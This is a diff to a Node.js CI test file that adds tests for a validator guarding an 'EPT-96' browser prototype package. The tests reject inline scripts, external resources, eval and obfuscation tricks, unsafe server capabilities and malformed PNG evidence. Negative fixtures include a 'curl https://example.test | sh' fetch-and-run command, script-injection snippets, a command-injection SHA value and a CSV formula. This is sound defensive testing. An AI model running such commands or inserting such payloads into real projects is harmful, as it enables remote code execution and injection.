@@ -2,9 +2,10 @@ import assert from 'node:assert/strict'
 import { createHash } from 'node:crypto'
 import { deflateSync } from 'node:zlib'
 import { deriveEpt95Png, designs, ept95Paths, validateEpt95Assets, validateEpt95Derivative } from './ept95-assets.mjs'
+import { capturas, ept96Paths, validarPng96, validateEpt96Assets } from './ept96-assets.mjs'
 import { test } from 'node:test'
 import { execFileSync, spawnSync } from 'node:child_process'
-import { mkdtempSync, readFileSync, readdirSync, rmSync, mkdirSync, writeFileSync, chmodSync, symlinkSync } from 'node:fs'
+import { cpSync, mkdtempSync, readFileSync, readdirSync, rmSync, mkdirSync, writeFileSync, chmodSync, symlinkSync } from 'node:fs'
 import { tmpdir } from 'node:os'
 import path from 'node:path'
 import { changedPaths, profile, pureTests, unsupportedPackage } from './impact.mjs'
@@ -24,7 +25,10 @@ test('malformed records fail closed', () => {
   for (const raw of ['M\0a', 'R100\0a\0', 'Z\0a\0', 'M\0../a\0', 'M\0/a\0']) assert.throws(() => changedPaths(raw))
 })
 test('PR plans never select the full matrix, including shared auth and infrastructure', () => {
-  for (const file of ['package-lock.json', '.github/workflows/ci.yml', 'src/proxy.ts', 'supabase/migrations/new.sql']) {
+  for (const file of ['package-lock.json', '.github/workflows/ci.yml']) {
+    assert.deepEqual(profile([file]), { db: true, mutations: false, ui: ['core'], prototipo: true }) // también recorre el prototipo
+  }
+  for (const file of ['src/proxy.ts', 'supabase/migrations/new.sql']) {
     assert.deepEqual(profile([file]), { db: true, mutations: false, ui: ['core'] })
   }
   assert.deepEqual(profile(['docs/plan.md', 'tests/tarifas-lib.spec.ts']), { db: false, mutations: false, ui: [] })
@@ -68,7 +72,7 @@ test('CLI validates SHAs and emits a bounded PR plan for initial publication', (
       const output = path.join(directory, `plan-${db}`)
       execFileSync(process.execPath, ['scripts/ci/impact.mjs'], { env: { ...process.env,
         CI_BASE_SHA: base, CI_HEAD_SHA: head, GITHUB_OUTPUT: output } })
-      assert.equal(readFileSync(output, 'utf8'), `db=${db}\nmutations=false\nui=${JSON.stringify(ui)}\n`)
+      assert.equal(readFileSync(output, 'utf8'), `db=${db}\nmutations=false\nui=${JSON.stringify(ui)}\nprototipo=${db}\n`)
     }
     assert.notEqual(spawnSync(process.execPath, ['scripts/ci/impact.mjs'], { env: { ...process.env, CI_HEAD_SHA: 'untrusted; command' } }).status, 0)
   } finally { rmSync(directory, { recursive: true, force: true }) }
@@ -301,7 +305,8 @@ test('EPT-95 acepta únicamente un paquete local completo, reproducible y móvil
     for (const file of ['docs/other.png', BASE + 'new.png', BASE + 'other.json', BASE + 'fuentes/nuevo.html', 'mobile/package.json', '../docs/a.md', 'C:/docs/a.md', '\\\\server/share', 'docs\\a.md']) {
       assert.throws(() => profile([file], { root: ok.root }), undefined, file)
     }
-    for (const file of ['scripts/ci/impact.mjs', 'scripts/ci/ept95-assets.mjs', 'scripts/ci/impact.test.mjs']) assert.deepEqual(profile([file]), { db: true, mutations: false, ui: ['core'] })
+    for (const file of ['scripts/ci/impact.mjs', 'scripts/ci/impact.test.mjs']) assert.deepEqual(profile([file]), { db: true, mutations: false, ui: ['core'], prototipo: true })
+    assert.deepEqual(profile(['scripts/ci/ept95-assets.mjs']), { db: true, mutations: false, ui: ['core'] })
   } finally { ok.cleanup() }
 })
 test('EPT-95 valida el paquete real completo del repositorio, no solo fixtures', () => {
@@ -415,4 +420,161 @@ test('EPT-95 valida documentos y bitácora, modos Git y enlaces', () => {
     execFileSync('git', ['-C', p.root, 'update-index', '--cacheinfo', `100644,${hash},${BASE + designs[0].archivo}`])
     validateEpt95Assets(p.root)
   } finally { p.cleanup() }
+})
+
+// =====================================================================================
+// EPT-96 · prototipo navegable: contenido activo con registro literal y análisis propio
+// =====================================================================================
+const B96 = 'docs/parte3/EPT-96/'
+const ept95Path = relativa => `docs/parte3/EPT-95/${relativa}`
+function paquete96(mutar = () => {}) {
+  const root = mkdtempSync(path.join(tmpdir(), 'ept96-assets-'))
+  cpSync(path.join(process.cwd(), B96), path.join(root, B96), { recursive: true })
+  const put = (relativa, contenido) => { mkdirSync(path.dirname(path.join(root, B96, relativa)), { recursive: true }); writeFileSync(path.join(root, B96, relativa), contenido) }
+  const get = relativa => readFileSync(path.join(root, B96, relativa), 'utf8').replace(/\r\n/gu, '\n')
+  mutar({ put, get, root })
+  return { root, cleanup: () => { assert.ok(path.resolve(root).startsWith(path.resolve(tmpdir()) + path.sep)); rmSync(root, { recursive: true, force: true }) } }
+}
+const esperar96 = (mutar, codigo, etiqueta) => {
+  const p = paquete96(mutar)
+  try { assert.throws(() => validateEpt96Assets(p.root), error => error.code === codigo, `${etiqueta}: se esperaba ${codigo}`) } finally { p.cleanup() }
+}
+
+test('EPT-96 valida el paquete real y clasifica sus rutas como contenido activo con navegación real', () => {
+  assert.deepEqual(validateEpt96Assets(process.cwd()), { archivos: 62, capturas: 47 })
+  assert.equal(capturas.length, 47)
+  const esperado = { db: false, mutations: false, ui: [], prototipo: true }
+  assert.deepEqual(profile([...ept96Paths]), esperado) // todas las rutas registradas, validando el paquete una vez
+  for (const file of [B96 + 'prototipo/js/app.mjs', B96 + 'pruebas/prototipo.mjs', B96 + 'evidencia/' + capturas[0] + '.png']) assert.deepEqual(profile([file]), esperado, file)
+  // Las fuentes y el logo que sirve el prototipo (EPT-95) también exigen recorrerlo.
+  assert.deepEqual(profile([ept95Path('fuentes/imagenes/logo-emblema.png')]), { db: false, mutations: false, ui: [], prototipo: true })
+  assert.deepEqual(profile(['scripts/ci/ept96-assets.mjs']), { db: true, mutations: false, ui: ['core'], prototipo: true })
+  // Sin excepción por extensión: rutas o directorios no registrados bloquean el plan.
+  for (const file of [B96 + 'otro.md', B96 + 'prototipo/js/extra.mjs', B96 + 'evidencia/nueva.png', B96 + 'prototipo/index.htm', B96 + 'servidor/otro.mjs', B96 + 'package.json']) {
+    assert.throws(() => profile([file]), /sin contrato/u, file)
+  }
+  assert.deepEqual(profile(['docs/evidence/EPT-96.md']), { db: false, mutations: false, ui: [] })
+})
+
+test('EPT-96: el gate de CI exige el paso del prototipo cuando el plan lo marca', () => {
+  const yml = readFileSync('.github/workflows/ci.yml', 'utf8').replace(/\r\n/gu, '\n')
+  for (const fragmento of ["prototipo: ${{ steps.impact.outputs.prototipo }}", "prototipo_paso: ${{ steps.prototipo.outcome }}", 'id: prototipo',
+    "if: steps.impact.outputs.prototipo == 'true'", 'run: node docs/parte3/EPT-96/pruebas/prototipo.mjs', 'PLAN_PROTOTIPO: ${{ needs.fast.outputs.prototipo }}',
+    'true) test "$PASO_PROTOTIPO" = success', 'false) test "$PASO_PROTOTIPO" = skipped']) assert.ok(yml.includes(fragmento), fragmento)
+  // El paso corre después de instalar Chromium y antes de los contratos DB/UI.
+  assert.ok(yml.indexOf('playwright install --with-deps chromium') < yml.indexOf('id: prototipo') && yml.indexOf('id: prototipo') < yml.indexOf('  database:'))
+})
+
+test('EPT-96 rechaza HTML con scripts en línea, recursos externos, eventos y estilos', () => {
+  const cambios = [
+    ['script en línea', h => h.replace('<script type="module" src="/js/app.mjs"></script>', '<script type="module" src="/js/app.mjs">alert(1)</script>')],
+    ['script externo', h => h.replace('src="/js/app.mjs"', 'src="https://example.test/a.mjs"')],
+    ['segundo script', h => h.replace('</body>', '<script type="module" src="/js/app.mjs"></script></body>')],
+    ['evento en línea', h => h.replace('<div id="app"', '<div onclick="x()" id="app"')],
+    ['iframe', h => h.replace('</body>', '<iframe src="/"></iframe></body>')],
+    ['style embebido', h => h.replace('</head>', '<style>body{}</style>\n</head>')],
+    ['estilo en atributo', h => h.replace('<p class="aviso-prototipo"', '<p style="color:red" class="aviso-prototipo"')],
+    ['hoja externa', h => h.replace('href="/estilos.css"', 'href="https://example.test/x.css"')],
+    ['meta refresh', h => h.replace('</head>', '<meta http-equiv="refresh" content="0">\n</head>')],
+    ['entidad numérica', h => h.replace('Prototipo navegable', 'Prototipo &#106;avascript')],
+  ]
+  for (const [etiqueta, nuevo] of cambios) esperar96(g => g.put('prototipo/index.html', nuevo(g.get('prototipo/index.html'))), 'E_ACTIVE_HTML', etiqueta)
+})
+
+test('EPT-96 rechaza CSS con importaciones, escapes y url() no registradas', () => {
+  for (const [etiqueta, texto] of [
+    ['@import', "@import url('https://example.test/x.css');\n"],
+    ['url remota', "body { background: url('https://example.test/a.png'); }\n"],
+    ['url local no registrada', "body { background: url('/activos/otra.png'); }\n"],
+    ['escape', '@\\69mport "x.css";\n'],
+    ['image-set', "body { background: image-set('/a.png' 1x); }\n"],
+    ['at-rule ajena', '@keyframes x { to { opacity: 0 } }\n'],
+  ]) esperar96(g => g.put('prototipo/estilos.css', texto), 'E_ACTIVE_CSS', etiqueta)
+})
+
+test('EPT-96 analiza módulos del navegador: red, almacenamiento, DOM desde texto, archivos y ofuscación', () => {
+  const agregados = [
+    ['fetch', "export const t = () => fetch('/x')\n"],
+    ['XMLHttpRequest', 'export const t = new XMLHttpRequest()\n'],
+    ['WebSocket', "export const t = new WebSocket('ws://127.0.0.1')\n"],
+    ['eval', "export const t = eval('1')\n"],
+    ['Function', "export const t = new Function('return 1')\n"],
+    ['constructor', "export const t = [].constructor.constructor('return 1')\n"],
+    ['import dinámico', "export const t = () => import('./datos.mjs')\n"],
+    ['import ajeno', "import fs from 'node:fs'\n"],
+    ['localStorage', "export const t = localStorage.getItem('x')\n"],
+    ['cookie', 'export const t = document.cookie\n'],
+    ['innerHTML', "export const t = el => { el.innerHTML = '<b>x</b>' }\n"],
+    ['insertAdjacentHTML', "export const t = el => el.insertAdjacentHTML('beforeend', 'x')\n"],
+    ['document.write', "export const t = () => document.write('x')\n"],
+    ['URL externa', "export const t = 'https://example.test/a'\n"],
+    ['input file', "export const t = { type: 'file' }\n"],
+    ['FileReader', 'export const t = new FileReader()\n'],
+    ['window.open', "export const t = () => window.open('/')\n"],
+    ['location.href', "export const t = () => { location.href = '/x' }\n"],
+    ['navigator', 'export const t = navigator.userAgent\n'],
+    ['acceso por corchetes', "export const t = window['fe' + 'tch']\n"],
+    ['escape unicode', 'export const t = proce\\u0073s\n'],
+    ['estilo en línea', "export const t = el => el.setAttribute('style', 'color:red')\n"],
+    ['setTimeout con texto', "export const t = () => setTimeout('x()', 1)\n"],
+    ['document.writeln', "export const t = () => document.writeln('x')\n"],
+    ['createElement de script', "export const t = () => document.createElement('script')\n"],
+    ['URL relativa al protocolo', "export const t = '//example.test/a'\n"],
+    ['atob', "export const t = atob('ZmV0Y2g=')\n"],
+    ['click programático', 'export const t = el => el.click()\n'],
+    ['setHTMLUnsafe', "export const t = el => el.setHTMLUnsafe('<b>x</b>')\n"],
+  ]
+  for (const [etiqueta, texto] of agregados) {
+    esperar96(g => g.put('prototipo/js/reglas.mjs', g.get('prototipo/js/reglas.mjs') + texto), 'E_ACTIVE_BROWSER', etiqueta)
+  }
+})
+
+test('EPT-96 analiza el servidor y el runner: capacidades, escritura, tabla cerrada y pruebas obligatorias', () => {
+  const servidor = 'servidor/servidor.mjs', runner = 'pruebas/prototipo.mjs'
+  const casos = [
+    ['child_process', servidor, g => "import { execSync } from 'node:child_process'\n" + g.get(servidor)],
+    ['importación no permitida', servidor, g => "import net from 'node:net'\n" + g.get(servidor)],
+    ['escritura de archivos', servidor, g => g.get(servidor) + "\nwriteFileSync('x', 'y')\n"],
+    ['ruta unida a la URL', servidor, g => g.get(servidor).replace("RUTAS.get(req.url ?? '')", 'path.join(prototipo, req.url)')],
+    ['decodificación de la URL', servidor, g => g.get(servidor) + '\nexport const d = decodeURIComponent\n'],
+    ['sin validación de Host', servidor, g => g.get(servidor).replaceAll('ANFITRION_VALIDO', 'OTRO')],
+    ['entorno', servidor, g => g.get(servidor) + '\nexport const e = process.env.SECRETO\n'],
+    ['URL externa', runner, g => g.get(runner) + "\nexport const u = 'https://example.test'\n"],
+    ['prueba obligatoria retirada (N08)', runner, g => g.get(runner).replace("prueba('N08'", "prueba('N98'")],
+    ['negativa del servidor retirada (S03)', runner, g => g.get(runner).replace("prueba('S03'", "prueba('S93'")],
+    ['sin cierre del navegador', runner, g => g.get(runner).replaceAll('browser.close()', 'browser.noop()')],
+    ['sin límite de tiempo', runner, g => g.get(runner).replaceAll('LIMITE_TOTAL_MS', 'OTRO_LIMITE')],
+    ['escucha en todas las interfaces', servidor, g => g.get(servidor).replace("listen(puerto, '127.0.0.1'", "listen(puerto, '0.0.0.0'")],
+    ['Host sin validar', servidor, g => g.get(servidor).replace('ANFITRION_VALIDO.test(req.headers', 'true || ANFITRION_VALIDO.test(req.headers')],
+    ['prueba obligatoria solo en comentario', runner, g => g.get(runner).replace("prueba('N08'", "// prueba('N08'\nprueba('N98'")],
+    ['prueba obligatoria sin aserciones', runner, g => g.get(runner).replace('aserciones++', 'void 0')],
+    ['sin verificación de pruebas ejecutadas', runner, g => g.get(runner).replaceAll('REQUERIDAS', 'OTRAS')],
+  ]
+  for (const [etiqueta, archivo, nuevo] of casos) esperar96(g => g.put(archivo, nuevo(g)), 'E_ACTIVE_NODE', etiqueta)
+})
+
+test('EPT-96 valida la evidencia PNG, el inventario, la bitácora y la receta', () => {
+  const primera = `evidencia/${capturas[0]}.png`
+  const png = fixturePng(390, 700)
+  const ok = paquete96(g => g.put(primera, png))
+  try { assert.deepEqual(validateEpt96Assets(ok.root), { archivos: 62, capturas: 47 }) } finally { ok.cleanup() }
+  assert.deepEqual(validarPng96(png, 'fixture.png'), { ancho: 390, alto: 700 })
+  const casos = [
+    ['firma inválida', g => g.put(primera, Buffer.from('<FIFE Image failed to fetch>')), 'E_PNG_SIGNATURE'],
+    ['PNG truncado', g => g.put(primera, fixturePng(390, 700).subarray(0, -3)), 'E_PNG_BOUNDS'],
+    ['lienzo de otro ancho', g => g.put(primera, fixturePng(1440, 900)), 'E_PNG_CANVAS'],
+    ['lienzo de factor 2', g => g.put(primera, fixturePng(780, 1688)), 'E_PNG_CANVAS'],
+    ['chunk de texto', g => { const base = fixturePng(390, 700); g.put(primera, Buffer.concat([base.subarray(0, 33), fixtureChunk('tEXt', Buffer.from('a\0b')), base.subarray(33)])) }, 'E_PNG_METADATA'],
+    ['archivo extra', g => g.put('evidencia/extra.png', fixturePng(390, 700)), 'E_UNKNOWN_RESOURCE'],
+    ['directorio desconocido', g => mkdirSync(path.join(g.root, B96, 'otros')), 'E_UNKNOWN_RESOURCE'],
+    ['archivo ausente', g => rmSync(path.join(g.root, B96, 'prototipo/js/vista.mjs')), 'E_PACKAGE'],
+    ['secreto en documento', g => g.put('README.md', '-----BEGIN PRIVATE KEY-----'), 'E_TEXT'],
+    ['script en documento', g => g.put('mapa-navegacion.md', '<script>alert(1)</script>'), 'E_TEXT'],
+    ['receta con comando ajeno', g => g.put('receta-prototipo.json', JSON.stringify({ baseline: 'a'.repeat(40), comandos: ['curl https://example.test | sh'] })), 'E_RECIPE'],
+  ]
+  for (const [etiqueta, mutar, codigo] of casos) esperar96(mutar, codigo, etiqueta)
+  for (const mala of ['fecha_art,actividad\n2026-10-10,x\n', 'fecha_art,actividad,herramienta,insumo,comprension_y_adaptacion,prueba_o_limite,resultado,origen\n2026-10-10,=1+1,a,b,c,d,e,f\n']) {
+    const p = paquete96(g => g.put('bitacora-academica.csv', mala))
+    try { assert.throws(() => validateEpt96Assets(p.root)) } finally { p.cleanup() }
+  }
 })
